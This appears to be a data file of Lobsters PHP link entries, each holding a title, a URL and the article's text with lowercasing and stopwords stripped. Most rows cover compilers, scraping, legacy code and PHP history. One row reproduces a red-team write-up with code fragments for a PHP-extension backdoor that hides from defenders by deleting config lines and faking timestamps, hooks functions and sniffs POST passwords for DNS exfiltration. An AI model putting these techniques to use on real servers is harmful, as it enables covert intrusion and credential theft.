112,Lobsters,php,PHP programming,"HHVM JIT: A profile-guided, region-based compiler for PHP and Hack",https://blog.acolyer.org/2018/08/08/hhvm-jit-a-profile-guided-region-based-compiler-for-php-and-hack/,hhvm jit profileguided regionbased compiler php hack,hhvm jit profileguided regionbased compiler php hack hhvm highlevel overview new hhvm jit important optimisation wholeprogram regionlevel hhirlevel vasmlevel evaluation,hhvm jit profileguided regionbased compiler php hack ottoni pldi hhvm virtual machine php hack php extension used power facebook website among others today paper choice describes second generation hhvm implementation delivered performance boost running facebook website compared previous hhvm implementation php code base run facebook website includes ten million line source code translated hundred megabyte machine code execution clearly suffering oversimplified understanding facebook web application actually time asked write facebook clone website backing service mobile apps etc would initial estimate order ten million line code hhvm highlevel overview starting point hhvm source code php hack hack php dialect used facebook includes support richer set type hint perspective hhvm though two language fundamentally equivalent particular hack type hint used static type checker discarded hhvm runtime reason discarding richer type hint runtime hack gradual type system unsound static type checker optimistic ignores many dynamic feature language therefore even program type check different type observed source code parsed hiphop compiler hphpc produce abstract syntax tree ast hhvm add new hiphop bytecodetobytecode compiler hhbbc translates ast hhbc bytecode hhvm number analysis optimisation performed translation hhbc done aheadoftime ie program actually executes hhbc stackbased bytecode meaning majority bytecode instruction either consume input push result onto evaluation stack runtime hhvm combine traditional threaded interpreter jit compiler important feature jit design use sideexits use onstack replacement osr compiled code execution always stop bytecodelevel program point transfer control back interpreter runtime system another compiled code region ability always fallback interpreter mean jit free focus mainline use case avoid weird corner case occur dynamic language eg multiplying string array largescale application also help manage cpu memory overhead incurred jit compilation since everything need jitcompiled core paper describes design implementation new hhvm jit new hhvm jit hhvm jit designed around four main principle type specialisation profileguided optimisation side exit regionbased compilation although principle used number previous system combination four principle dynamiclanguage jit compiler novel best knowledge type specialisation us type information obtained either statically generate type specific code example code specialised integer reference counted efficient tradeoff made performance boost specialised code overhead generating lot typespecific routine overspecialisation one key source dynamic type information hhvm jit us profiling profileguided optimization pgo also called feebackdriven optimization fdo class optimization either enabled enhanced use runtime information beyond informing type specialisation profile information also used code layout method dispatch sideexits aka uncommon trap allow jit specialize code common type without supporting uncommon type may even possible runtime code generation hhvm based region regionbased compilation region restricted entire method single basic block straightline trace regionbased compilation work well type specialisation profileguide optimisation sideexits profiling highlight region used compile generated code common type sideexits fall back interpreted execution le common case data structure used represent region bytecode level region descriptor region descriptor contain controlflow graph cfg node basicblock region used profiling every block region descriptor contains sequence bytecode instruction precondition type guard postconditions known type end translation type constraint encoding information much knowledge required input type order generate efficient code region descriptor lowered hiphop intermediate representation hhir typed representation using static single assignment ssa form type information come hhbbc compiler profiling data hhir level code optimisation happen level hhir virtual assembly vasm representation instruction set close machine code support infinite number virtual register three different compilation mode within hhvm jit live translation kind supported first generation implementation profiling translation basic optimisation plus insertion block profiling fully optimised translation important optimisation full optimisation pipeline applies optimisation level abstraction summarised figure prior regionbased optimisation also couple important wholeprogram optimisation wholeprogram function sorting place function commonly call close memory weighted directed call graph built program using basic block profile counter inform weight function clustered sorted algorithm fast enough handle large amount code generated support facebook website one second huge page hot code clustered code cache mapped onto huge page regionlevel live profiling translation region formed inspecting vm state flowing live type optimised translation collected profile information used single function may broken multiple region conversely region may contain portion multiple function partial inlining function associated weighted cfg block within grouped region using depthfirst search block arc optionally skipped based weight guard relaxation help avoid overspecialisation compiler specialises code excessively leading code bloat name suggests guard relaxation weakens type guard precondition circumstance allow type go course corresponding generated code slightly le efficient must cope type still much better fully general code example integeronly guard may relaxed allow integer double hhirlevel partial inlining used inline common simple method getters setter partial full inlining lead code bloat php us reference counting manage memory common type string object array naive reference counting solution lead significant overhead hhvm jit us reference counting elimination avoid reference counting possible essence idea sink increment instruction call graph provable safe increment instruction sink next decrement instruction pair eliminated method dispatching optimised using information profiler specialised hhir emitted devirtualize momomorphic call b optimise call common base class c optimise call method implement interface vasmlevel evaluation evaluation based measurement taken facebook website running hhvm top line result seen following figure take bit interpreting jitregion bar show performance full optimisation path normalised previous generation hhvm jit support live translation performance represented jittracelet bar live translation path achieves full optimisation performance put another way region jit hhvm provides speedup performance achieved profile translation show jitprofile bar full optimisation performance even profile translation generates code faster interpreted code contribution various optimisation seen following chart explores relative slowdown selectively disabling individual optimisation
113,Lobsters,php,PHP programming,"Don’t clone your php objects, DeepCopy them",https://dcsg.me/articles/dont-clone-your-php-objects-deepcopy-them/,clone php object deepcopy,disclaimer clone clone keyword shallow library deepcopy deepcopy,disclaimer intent blog post stop using clone keyword raise awareness behavior since imo documentation clear know php wellknown clone keyword shallow copy object property hood create new object exact value object property unless change behavior implementing clone function class behavior seems expected however might give result object cloning contains property object see php final class car public model making public write le code public function construct carmodel model model model final class carmodel public name public year public function construct name year name name year year two simple class one car another model let see happens create new car clone change model name one php new car new carmodel clone vardump splobjecthash vardump splobjecthash far good two object different id let see happens model property object vardump splobjecthash model vardump splobjecthash model see model object object id mean change model name one object reflected model name vardump model object carmodel name year int vardump model object carmodel name year int would expect result probably happening php regenerate memory address object property object cloning traverse property regenerate solve fortunately library deepcopy lib need deepcopy recursively traverse object property clone ensuring every object inside object cloning new instance hence new object id let see visual representation clone deepcopy work clone deepcopy let see fix code php use function deepcopydeepcopy new car new carmodel deepcopy vardump splobjecthash model vardump splobjecthash model two different object id model object object model name vardump model object carmodel name string year int vardump model object carmodel name string year int solved hope help understand bit better clone keyword use wisely edit add disclaimer
114,Lobsters,php,PHP programming,How F5Bot Slurps All of Reddit,https://intoli.com/blog/f5bot/,slurps reddit,codepleacom githubcomcodeplea reddit listing api good documentation http wwwredditcomrallnewjson curl jsondecode json http wwwredditcomrallcommentsjson http wwwredditcomrallnewjson making multiple simultaneous connection http wwwredditcomrallnewjson completely new approach http apiredditcomapiinfojson id reddit api access rule working data ahocorasick string searching algorithm github conclusion reddit api access rule give try http codepleacom follow github,guest post lewis van winkle talk free service email selected keywords mentioned reddit hacker news lobster explains detail able process million comment post reddit every day single vps check lewis van winkle writing codepleacom open source contribution githubcomcodeplea run free service basic premise enter keywords monitor email whenever keywords show reddit hacker news hoping add site soon post going built service specifically going focus scraping every post comment reddit real time written php programmed boring straightforward manner anything special really manage scan every reddit post comment realtime tiny lowend vps sometimes people surprised tell reddit huge volume say reddit run roomfull super computer still downtime like every day well going tell reddit get new post new comment every day combined post come constant rate though better able handle hundred second may think php slow definitely handle mean long take search hundred file computer really key thing need write program careful way waste resource careful able handle traffic let get started reddit listing api reddit offer nice json api good documentation pretty sure site us internally render html page visitor use grab recent post http wwwredditcomrallnewjson recommend open browser follow along php grab simple curl decode jsondecode side note going completely skip error handling boring mean important part running actual reallive server boring talk anymore ch curlinit curlsetopt ch curlopturl http wwwredditcomrallnewjson curlsetopt ch curloptreturntransfer curlsetopt ch curloptuseragent nt forget name post curlexec ch curlclose ch post jsondecode post true printr post example showing basic structure json get back trimmed leaving post removing keyvalue pair lot kind listing data modhash dist child kind data approvedatutc null subreddit guitar selftext practice guitar every day every day userreports saved false modreasontitle null gilded clicked false title discussion thanks everyone subredditnameprefixed rguitar hidden false id many keyvalue pair kind data approvedatutc null subreddit gpdwin selftext would cheapest way purchase unit userreports saved false modreasontitle null gilded clicked false title looking advice buying win uk subredditnameprefixed rgpdwin hidden false id many keyvalue pair many object null depending php setup curl may trouble secure http connection case bypass curlsetopt ch curloptsslverifypeer false recent post post nice clean php array going short article pretty much done wait many post get want scraper run every minute better lot print downloaded count post data child postsn downloaded post well bit tedious want run scraper every minute constantly better get least minute worth post post let grab safe add end url curlsetopt ch curlopturl http wwwredditcomrallnewjson print downloaded count post data child postsn downloaded post turn reddit limit show post time easy solution though look closely json see field id field tell u post id came oldest post saved really call api ask post starting post id post data curlsetopt ch curlopturl http apiredditcomapiinfojson id work well point point post either loop back beginning start showing post already seen stop returning anything big fan scraper little time like go back grab old post maybe worried everything said post also true comment difference new one http wwwredditcomrallcommentsjson instead http wwwredditcomrallnewjson come much quicker got even bigger problem request take second much longer reddit server loaded mean pull comment quickly coming remember comment get posted rate per second much peak traffic making multiple simultaneous connection make bunch connection php make easy enough curlmulti function getting ahead pulling listing know id start next request current request finished reddit thing like post comment unique id post id start comment id start api inconsistent whether us prefix place api require prefix use id prefix id encoded base therefore use ten digit twenty six letter az php use baseconvert convert decimal math get recent post id convert decimal ch curlinit curlsetopt ch curlopturl http wwwredditcomrallnewjson curlsetopt ch curloptreturntransfer post curlexec ch curlclose ch post jsondecode post true id post data child data id id baseconvert easily math id convert back reddit format baseconvert pretty convenient best part bandwidth going save using base instead going need since almost entire reddit api consists crap almost certainly never need mean really want subreddit name subredditnameprefixed one r front fact take look json http wwwredditcomrallnewjson basically use selftext subreddit permalink url title wasted bandwidth actually half reply json key text even going use every value spending bandwidth json key name actual data oh well guess still better xml anyway manipulate reddit id turn comment post assigned id le serially strictly monotonic short term long term ie post hour ago lower id post right post second ago may find start api call simply subtracting starting id using method download bunch post latest post downloaded simultaneously assumes already loaded id latest post id decimal mh curlmultiinit curl array ch curlinit url http wwwredditcomrallnewjson baseconvert print urln curlsetopt ch curlopturl url curlsetopt ch curloptreturntransfer curlmultiaddhandle mh ch curl ch id running null curlmultiexec mh running running echo finished downloadingn foreach curl ch responsecode curlgetinfo ch curlinfohttpcode responsetime curlgetinfo ch curlinfototaltime post curlmultigetcontent ch post jsondecode post true print response responsecode time responsetime post count count post data child starting id post data child data id n curlmultiremovehandle mh ch curlmulticlose mh try push back past post get empty reply assuming ok post limit done got api totally figured scraping solved problem ready finish building bot look post id getting find funny business post repeated big deal ignore also post missing big deal slurping reddit missing post missing post caused id totally order maybe bug know case nothing know need another solution post limit really annoying anyway comment limit meant going need scrape every second avoid missing anything really viable longterm completely new approach reddit listing apis terrible trying see every post comment fair probably designed guess designed work website render page real human would want keeping clicking past post approach ended using worked much better request post id right instead asking post batch going need ask post individually post id comment huge advantage first important miss post second get post twice third go back time far want mean run scraper huge batch every minute downtime go back get old post missed perfect find starting post id get post individually http apiredditcomapiinfojson id need add big list post id end api url post spread batch download simultaneously assumes already got last post id loaded id print starting id idn url array id array j j j id id id baseconvert baseconvert url http apiredditcomapiinfojson id implode id mh curlmultiinit curl array foreach url url ch curlinit curlsetopt ch curlopturl url curlsetopt ch curloptreturntransfer curlsetopt ch curloptuseragent actually needed print urln curlmultiaddhandle mh ch curl ch running null curlmultiexec mh running running print finished downloadingn foreach curl ch responsecode curlgetinfo ch curlinfohttpcode responsetime curlgetinfo ch curlinfototaltime post jsondecode curlmultigetcontent ch true print response responsecode time responsetime post count count post data child starting id post data child data id n curlmultiremovehandle mh ch curlmulticlose mh end pretty long url reddit seem mind also please note actually need set useragent infojson api point apparently reddit blocked phpcurl probably good idea set useragent everything omitted shorten code sample see reddit api access rule info script get output like finished downloading response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id response time post count starting id even though asked post batch many batch short two reason first post going private community access able see nothing second post id assigned perfect order could missing post written yet case wait second another request missing id big deal way code also work perfectly comment difference comment id start instead issue may run loading comment api return title post comment attached need use parentid field get parent post id need separate call load post grab title luckily batch bunch call together one request working data got figured scraping reddit realtime tough launched worked fine long time eventually however ran second problem processing data became bottleneck remember tiny vps fast connection anemic cpu search every post comment keywords user started something like foreach newposts post foreach allkeywords keyword strpos post keyword false found relevant post imagine get user keywords eventually searching post thousand keywords get bit slow eventually converted using ahocorasick string searching algorithm really slick put keywords tree structure preprocessing step need look post one time see keywords contains find ahocorasick implementation php wrote github conclusion scraping reddit realtime require lot processing power careful know work around apis implement idea please sure follow reddit api access rule cool offer public api hope enjoyed writeup special thanks intoli evan sangaline idea write article hosting like know people reddit hacker news talking company product please give try free want read post check blog http codepleacom follow github
115,Lobsters,php,PHP programming,Improving PHP extensions as a persistence method,https://x-c3ll.github.io/posts/PHP-extension-backdoor/,improving php extension persistence method,improving php extension persistence method tarlogic blog backdoor xamp stack part php extension introduction phpini modified backdoor still alive minit mshutdown bring memory hooked feeling exfiltrating credential via pam backdoor dns request hashtable zendcompilerglobals zendhashstrfindptr function code documentation p sniffing parameteres getpost rinit phpvariablesc hashof final word,improving php extension persistence method operation red team tend use different persistence method every technique pro contra choice usually based context case server situated perimeter php extension great election made introductory post old technique tarlogic blog backdoor xamp stack part php extension recommend read first post intro talk basic topic like create compile extension takeaway article reduce track hooking php function extract useful info red team perspective interception getpost parameter p example tested php environment change php php api internals introduction fast recap classic xamp stack php interpreter load php extension startup added phpini file extensionpathtoourextension php extension interested mainly hook minit mshutdown rinit rshutdown executed usually root interpreter start stop r executed every request server user read http header request trigger action example execute command initiate reverse shell keep acces compromised server php extension really nice choice interact kind backdoor using legitimate http request seen recommended article firewall network rule detect u unfortunally load extension need modify phpini file reload gracefully configuration phpini restored size hash timestamp differ operation disclosed blue team win lose course phpini modification detected inmediately file integrity reality socs tends ignore kind alert usually noise made update sysadmin touching system phpini modified ok alert generated modified phpini someone sshs server cat phpini see nothing l timestamp fine server restarted gracefully doublecheck nothing weird happens backdoor still alive happening php extension loaded need keep line extesionpathtoourso inside phpini file retrieve original status programatically taking advantage minit hook delete line added phpini extension loaded hook triggered root usually edit phpini file without problem way use mshutdown insert snippet code destinated add line phpini server restarted line added extension loaded minit executed cicle closed using approach phpini file show anything weird part time generic function expressed like code suck int modifyextension int action char source null char needle null file fp sizet newsize fp fopen phpini fp null action fseek fp seekend long bufsize ftell fp filesize bufsize return source malloc sizeof char bufsize alloc memory read phpini fseek fp seekset return free source newsize fread source sizeof char bufsize fp ferror fp return free source else source newsize needle strstr source location needle file tmp fopen tmptmpini w fwrite source needle source tmp len nextensionkkso fclose tmp rename tmptmpini phpini free source fclose fp action fwrite nextension fp fwrite location strlen location fp fclose fp fprintf stderr extension added phpinin else return return counterpart tactic server killed unexpected way mshutdown hook executed hand timestamp modified need keep mind define phpini uknowthatphpini struct stat st stat phpini st change newtimeactime ststatime newtimemodtime ststmtime utime phpini newtime restoring timestamp always cool trick bring memory saw restore phpini need delete restore backdoor shared object working userland level use rootkit simple lkm example hide without problem moment extension loaded save content memory easily delete file something like simple poc phpminitfunction poc executed module loaded privilege root usually int fd check struct utimbuf newtime fprintf stderr loadedn calculate size file struct stat st stat location st return success filesize ststsize open file fd open location ordonly fd return success map file memory mapedfile mmap null filesize protread mapprivate fd close fd delete file remove location get timestamp stat phpini st modify phpini delete extension line check modifyextension check fprintf stderr phpini could editedn else fprintf stderr phpini editedn fake timestamp newtimeactime ststatime newtimemodtime ststmtime utime phpini newtime next step use mshutdown hook write shared object memory file phpmshutdownfunction allocer write file edit phpini fake timestamp mapedfile mapfailed return success int check file fp struct utimbuf newtime struct stat st fp fopen location w fwrite mapedfile filesize fp fclose fp munmap mapedfile filesize stat phpini st newtimeactime ststatime newtimemodtime ststmtime check modifyextension utime phpini newtime return success hooked feeling know leave minimum track post tarlogic blog explained communicate backdoor trigger action via http header let move interesting thing like hooking readteamers eager hunting credential help u lateral movement place hook wellknown function like one used hash password used insert new user database retrieve critical info exfiltrated vía dns shown post exfiltrating credential via pam backdoor dns request simple poc going hook php function let dive deep inside php internals function symbol table stored hashtable inside structure zendcompilerglobals struct zendcompilerglobals zendstack loopvarstack zendclassentry activeclassentry zendstring compiledfilename int zendlineno zendoparray activeoparray hashtable functiontable function symbol table access functiontable member vía cg compiler global macro search address function hashtable use zendhashstrfindptr search key lastly need modify handler point address function make point hook something like placed minit zendfunction orig orig zendhashstrfindptr cg functiontable strlen orig internalfunctionhandler check original function code phpnamedfunction zendstring arg zendbool rawoutput context unsigned char digest zendparseparametersstart zparamstr arg zparamoptional zparambool rawoutput zendparseparametersend create hook first need define correct data type args offical documentation appears phpnamedfunction whatever expands void zifwhatever internalfunctionparameters hook must created like test hook void internalfunctionparameters phpprintf hook calledn zendstring arg zendbool rawoutput zendparseparametersstart zparamstr arg zparamoptional zparambool rawoutput zendparseparametersend phpprintf called parameter zstrval arg compile execute mothra arcadia sudo usrlocalbinphp r echo kk loaded phpini edited hook called called parameter kk perfect way call original arbitrary code executed left exercise reader easy reference original address modified p sniffing parameteres getpost hooking juicy function nice way retrieve info know existence cool parameter sent via post get example login form far better hunt value going place code inside rinit hook executed every time request processed order retrieve information need check php engine phpvariablesc zvalptrdtornogc pg httpglobals trackvarspost zvalcopyvalue pg httpglobals trackvarspost array variable taken array httpglobals easiest way search particular value example want exfiltrate pas parameter sent login form fetch hashtable array use api search search function magic function hashof zval password zval postarr hashtable posthash postarr pg httpglobals trackvarspost array posthash hashof postarr password zendhashstrfind posthash pas strlen pas password phpprintf password zstrvalp password test mothra arcadia curl data password password saved inside file sent u via dns authoritative dns server owned u final word php extension powerful way keep persistence inside compromised target course best excuse start playing php internals find useful article wan na point error typo feel free contact twitter
116,Lobsters,php,PHP programming,"9 ways to master awful code, fast",https://techbeacon.com/9-ways-master-awful-code-fast,way master awful code fast,code look awful poor code ask help efficient strategy make list concept nt make sense make easy reproduce bug git version control build diagram component mind map entityrelational diagram prepare automated testing unit test integration testing functional identify unusual inadequate coding strategy first work small task andy hunt dave thomas pragmatic programmer get familiar ground tackling critical code deal unfamiliar tech stack share idea found experience keep learning,given task implementing new feature old codebase code look awful understand quickly possible several shortcut help learn important part new code without getting lost irrelevant detailsas programmer often join new project quality code place even organized team keeping code quality consistent throughout mediumsizetolarge project challengethat understanding poor code quickly valuable skill help become productive short time reduce stress usually come new guy play catchup conversation coworker knowing person talking half time terrible feelingon hand prime opportunity showing client bos worth get speed quickly impress developer take week month become really productive codebase build themselveshere master awful code quicklyask help efficient strategyother people already learned code work ask might think make look like newbie showing curiosity strong impact image employee bos expectation get productive fast without asking question misjudgment parteveryone take time get speed ask question impress people right attitude teamworkin many case original developer made strange unexpected decision talking code much valuable reading even case documentation lacking remember existing developer valuable project knowledge written anywheremake list concept nt make sense youthere might business concept new overly complex important get clarification trying work code handle concept avoid misunderstanding might take figure outit might even case idea mislabeled represented unexpected way database avoid getting stressed wrapping brain around go source ask coworkers itin vein might module class entity nt appropriate name make note poorly named element lead great confusion document early well anything else negatively affect ability think code worksmake easy reproduce bugsby adding code versioning virtual machine docker vagrant greatly reduce time take reproduce bug test work new featureany kind misunderstanding code work could lead path building wrong thing either building might already nt seen thing nt work way thoughtat point want git version control project way youll able go back stable release even work separate branch discarded neededit even possible gain greater reproducibility git since use stash add testing debugging code dig hardtotrack problemto learn project architecture take configuration documentation task early onthe said vms reproducibility become ubiquitous modern development team certainly run project using even ready run inside one sometimes first step new team member document step took get environment working eventually turn step vm setup scriptbuild diagram componentsa mind map business concept entityrelational diagram erd database table simple diagram code component greatly help reduce pain understanding new code nt remember something work keep erd openin fact graphical tool help digest information quickly tenthousandfoot view project valuable example tool could help dependency graph log map project technology stackone greatest time consumer development integration point system global view project landscape help identify integration point interesting examine spot work put bugson hand technology move fast could opportunity replace large part codebase modern properly integrated solution old framework might developed new official way solve problem entirely new library could developed better compatibility minduse visualization modeling tool view big pictureprepare automated testingbefore start breaking thing always prudent add relevant unit test problem testing poor code poor code usually tightly coupled hard impossible test ca nt isolate component intertwined indivisiblein case take step back test farther away usually mean integration testing many tool available web apps tested http request least possible verify system respond way inputsintegration testing much worse performance unit test though whenever implement unit test faster feedback code change possible opt functional even integration testingthis step shed light part code need work large amount tightly coupled code good target refactoring integration test done unit testing lateridentify unusual inadequate coding strategiesit time start refactoring start usually best place thing look weird development best practice followed web development could mean fat controller tightly coupled model codekeep mind strategy might use elsewhere example identify fat controller present likely previous developer attempt thin controller expect see problem controller well since reflected style shortcoming development process nowat first work small taskfixing small bug feature conceptually simple enlightening help feel productive startthis similar idea andy hunt dave thomas call tracer bullet pragmatic programmer underlying logic work something endtoend prove possible progressively improve initial workthe tracer bullet approach credit pragmatic programmera good example kind simple improvement make take small refactoring step simple code identify common programming practice followed apply itone favorite unnesting conditional block instead several ififif block one inside negate first one return validationtype check find simple inverting check moving code around risk almost nonexistent flat code easier readbe sure work first refactoring feature easy test even though change lowrisk always good idea able validate code sending productionget familiar ground tackling critical codealways learn project set first dive architectural side critical piece business integration code hardest understand modify avoid getting trouble early onas general rule avoid business issue would require know currently project business side usually mean stay away transactional payment mathheavy code starting become familiar groundonce productive comfortable coding style project trouble fixing simple issue time work harder beforeeven urgency fixing payment issue example kind task incredibly risky mistake could cost project dearly well absolutely refuse work highrisk task early possiblehow deal unfamiliar tech stackfor last point common problem run every new project usually includes technology familiar withwhen happens couple strategy help get speed fast obvious path learning reading documentation getting familiar new technology learn lot structure path help learn corner case typically come experience corner case engineering term refers situation occurs outside normal operating parameter one way speed process gaining experience take questionbased resource stack overflow quora read like book find popular question library learning see kind problem people typically run going necessarily run knowing possible like shining bright light onto mind map new ideasleverage stack overflow question gain experience fast credit stack overflowfor targeted approach find information library feature used new project specifically look new learn ahead time touch code allshare ideaslearning new complex thing easy everyone develops strategy mine love hear approach found experience please share comment field keep learning
117,Lobsters,php,PHP programming,The History of Rewriting PHP,https://thehistoryoftheweb.com/php/,history rewriting php,ncsa mosaic related interview recursive acronym somewhere around,work web know software thing always go right first time web massive global community tinkering loosely connected technology piece together website luck work well together tool technology always flux plenty stop start restarts often restart involves referred rewrite mean software dismantled core put back together piece piece way hopefully vastly improves thing people using web thing move fast rewrite happening almost timephp version one timesin andi gutmans zeev suraski decided going use php college coding project university tel aviv assignment build ecommerce shopping cart teacher knew php still le untested technology suggested try something different something bit proven especially something advanced gutmans suraski stubbornly refused stuck phpwithin first hour getting started realized right ran one weird quirk code writing another investigating bit found problem code embedded deep inside php source code basically way make work therefore way finish shopping cart thankfully teacher showed mercy let switch thing instead simple shopping cart would rewrite php ground announcement php lot time exactly rewrite get started active developer get fed enough software tool programming language decides give whole thing another go ask creator php basically thing one occasionthe first major rewrite php happened way back gutmans suraski even began working software would go several history php history change progression stretch back early day weband trace back far enough find started cgi scriptsway back ncsa mosaic day web first beginning spread developer found hitting wall html page static design give browser html document render exactly every single time way change content hit browser way update page javascript barely thought point make html approachable easy use fit right line web general mantra could also rather limiting wanted say update stock ticker pull data formto solve particular issue folk ncsa cooked common gateway interface cgi first released cgi allowed developer use advanced programming language like c perl process generate dynamic html technical specific far important important cgi gave programmer ability change html webpage le real time could thing like keep section webpage date process form submission add comment blog post thing require content webpage update original versionrasmus lerdorf among cgi earliest adopter began tinkering long release adapted code wrote run using cgi personal website mostly track number visitor coming site thinking might others would benefit work generally advocate open free exchange web lerdorf packaged tool working released code public moniker personal home page tool june went php tool shorthis hope people might find code useful truth small community developer began congregate around tool tweaking use site project people even began contributing code back projectwhen lerdorf realized something php got first major rewrite lerdorf got started rewrite almost immediately php tool initial release october lerdorf help developer got together new unified version software went name personal home page construction kit brief time fi form interpreter core remained basically tool built top cgi etrade early adopter phpthis however would last long user began use software lerdorf realized wrote quite enough people actually using loosely connected bundle script replacement fullon programming language geek meant combination c php tool php tool software stuck two world one hand extremely powerful cgi tool sorely lacking programming languageit time another php rewrite number following along spring lerdorf released entirely new version tool time called phpfi first version tool could actually stake claim programming language went beyond dynamic content webpage phpfi allowed developer connect database process form data even extend language functionsphpfi gained bit following pretty approachable far programming language go specifically pieced together dynamic web kind appeal growing number developer focusing exclusively web also version caught attention gutmans suraskiactually gutmans suraski using phpfi become bit tradition shortly initial release phpfi lerdorf got work completely rewriting underlying technology tool time two student started tinkering already released version forward university project gutmann suraski tasked approaching rewrite php got contact lerdof developer working project along basically gathered intel everything come go also set goal suraski later related interview create real language based statement expression association rule big break phpfi make easy extend adding functionality phpfi required change parser scanner generally speaking quite difficult task wanted create base people would able easily contribute make go much flunking university coursesafter month sent completely rewritten parser php lerdorf impressed enough gather together developer actively working language pull something new together end actually managed check suraski boxesin june php version officially released faster took lesson object oriented programming cleaned bug added sort new feature language renamed briefly becoming professional home page tool finally settling recursive acronym dropping pretense become php early example php based forum called phorumif work php version probably earliest version recognize lot work done time managed stick around even today ti release phpfi running around website within year half number would jump half millionof course last rewrite php language still actively maintained received pretty much major update couple year ago estimate put number website use php somewhere around website might taken get eventually php able grab foothold let go sincethe history web twicemonthly newsletter sign right
118,Lobsters,php,PHP programming,Wordpress Compiled into a .NET assembly,https://github.com/iolevel/wpdotnet-sdk,wordpress compiled net assembly,wordpress net standard assembly without php add wordpress aspnet core app aspnet core middleware configuration http wpdotnetsaltsazurewebsitesnet configuration method running repo source cmd v vscode wordpress net sdk app peachpiedwordpress peachpiedwordpressstandard peachpiedwordpressaspnetcore possible use case improve performance write plugins c integrate wp net application sourceless distribution take advantage prerequisite marketplace,wordpress net standard assembly without php chat community gitter need help add wordpress aspnet core app use wordpress aspnet core middleware add package reference peachpiedwordpressaspnetcore prerelease add wordpress middleware within configure startup method public class startup public void configure iapplicationbuilder app appusewordpress configuration appsettingsjson wordpress net configured using standard appsettingsjson longer editing wpconfigphp source file wordpress dbhost localhost dbpassword password dbuser root dbname wordpress dbtableprefix wp salt authkey r eombkevlg f authsalt azvj sc j pkutir zr loggedinkey aaienfsridcuzf v rclg mopkwe tsswa loggedinsalt c ddi p g dhwl noncekey z mcha osldh rt nizxkygwu hd vk knb noncesalt pz w g qn secureauthkey pc llsklvqibzm g xv e secureauthsalt n ow mvzf auuxuawf wqq vjt tb constant generate unique set salt feel free use daniel llewellyn tool http wpdotnetsaltsazurewebsitesnet note wordpress expects mysql database running database dbname already created otherwise get error configuration value omitted use default value configuration method service configured using addwordpress configuration method first argument callback providing option object modified public class startup public void configureservices iservicecollection service servicesaddwordpress option optionsdbhost localhost optionsdbname wordpress option object already initialized default value appsettingsjson configuration running repo source start mysql user root password password created database wordpress cmd dotnet run p app v open solution start app project vscode open folder hit wordpress net sdk solution provides wordpress net standard assembly consisting following project app demo project run wordpress part aspnet core application peachpiedwordpress contains source wordpress compiled single net standard assembly peachpiedwordpressdll together content file packed nuget package peachpiedwordpress project contains additional file wpcontentmupluginspeachpieapiphp mustuse plugin exposing wordpress api net wpdummyphp declaring dummy class required used plugins compiled successfully peachpiedwordpressstandard defines abstraction layer providing net interface php wordpress instance interface implemented provided peachpieapiphp peachpiedwordpressaspnetcore aspnet core request handler configures aspnet pipeline pas request compiled wordpress script configuration includes response caching short url mapping various net enhancement setting wordpress database project contains complete source code wordpress additional must use wordpress plugin expose php api net purpose code compiled peachpie resulting output running purely microsoft net core therefore everything work see standard unchanged wordpress way would traditional php version difference compiled website run net core background also approach allows take advantage aspnet core request handling make possible extend wordpress c ie plugins theme etc possible use case improve performance compiled code fast also optimized net jitter actual system additionally net performance profiler may used resolve bottleneck write plugins c plugin functionality implemented separate c project andor php plugins may use net library utilize net advantage like sourceless distribution type safe compiled code optimized checked actual platform integrate wp net application drive wordpress life cycle c app run within kestrel web server sourceless distribution compilation source file needed file contain metadata like plugins theme kept output take advantage net runtime jitted secure manageable platform prerequisite net core newer mysql server optionally visual studio visual studio code using official peachpie vscode extension available marketplace
119,Lobsters,php,PHP programming,PHP Parser Written in Go,https://github.com/z7zmey/php-parser,php parser written go,php parser written go goyacc ragel ast try online demo feature us vkcomnoverify quasilytephpgrep usage example roadmap install cli namespace resolver,php parser written go project us goyacc ragel tool create php parser par source code ast used write static analysis refactoring metric code style formatting tool try online demo feature fully support php php syntax abstract syntax tree ast representation traversing ast resolving namespaced name parsing syntaxinvalid php file saving printing freefloating comment whitespaces us vkcomnoverify noverify pretty fast linter php quasilytephpgrep phpgrep tool syntaxaware php code search usage example package main import fmt o func main src byte echo hello world parser src parserparse e range parsergeterrors fmtprintln e visitor visitordumper writer osstdout indent rootnode parsergetrootnode rootnodewalk visitor roadmap control flow graph cfg phpdoccomment parser stabilize api install go get cli phpparser flag path flag type description p bool print filepath string dump format custom go json prettyjson r bool resolve name ff bool parse show free floating string prof string start profiler cpu mem trace bool parse dump ast stdout namespace resolver namespace resolver visitor resolve node fully qualified name save map nodenode string structure class interface trait function constant node save name current namespace name relative fullyqualified node resolve use alias save fully qualified name
120,Lobsters,php,PHP programming,How to mess with your roommate,https://bernsteinbear.com/blog/how-to-mess-with-your-roommate/,mess roommate,prank prank setup http ourapartmentserver prank result pranker pranked step step step step tom hebb,explain hurt poor logan must explain apartment medium setup see shortly logan reading hope entertained computer running ubuntu desktop connected tv act medium server also generally useful internetconnected also serf couple webpage ssh server handful service since tv desktop computer salvaged graphic card acceptable logan decided purchase severalgenerationsold nvidia graphic card far better existing one display smooth video prank shortly installation couple driver glitch point thought would humorous way manually launch error message internet searching became apparent remotely displaying message tv simple ssh box user displaying content zenity info text hello bit necessary display session connected want show primary viewing display since trouble nvidia graphic card however went something similar zenity warning text display running lowgraphics mode gave go worked manually logging server ssh client every time wanted bother logan pain decided get crafty thought making cron job bother regularly two problem regular real cron job make sneaky new one discoverable option like sysvinit script also similar reason decided instead making publiclyaccessible webpage button fuck logan prank setup order execute figured needed couple thing something handle user input something execute arbitrary command web user behalf end nginx nginx fpm extension php php fpm package went set website http ourapartmentserver landing page loganhtml action page zenityphp loganhtml html head style type textcss form button fontsize divexplanation width style meta name viewport content widthdevicewidth userscalableno meta httpequiv xuacompatible content ieedge meta name handheldfriendly content true head body form method post action zenityphp button fuck logan button form body html nonsense meta tag make page easier use phone making easier use onthego remember render html head people imagine page look like button clicked post another page heavy lifting php zenityphp message array error occurred error occurred error occurred error occurred error occurred error occurred graphic driver could find compatible graphic hardware display driver stopped responding display driver stopped responding display driver stopped responding display driver stopped responding recovered system running lowgraphics mode system running lowgraphics mode system running lowgraphics mode system running lowgraphics mode system running lowgraphics mode system running lowgraphics mode nvidia driver installer stopped responding nvidia stopped device reported problem code error occurred iface status array error warning msg message arrayrand message status status arrayrand status timeout timeout exec sudo u thedisplayuser usrsbinzenity status text error msg timeout devnull include loganhtml div class explanation popup 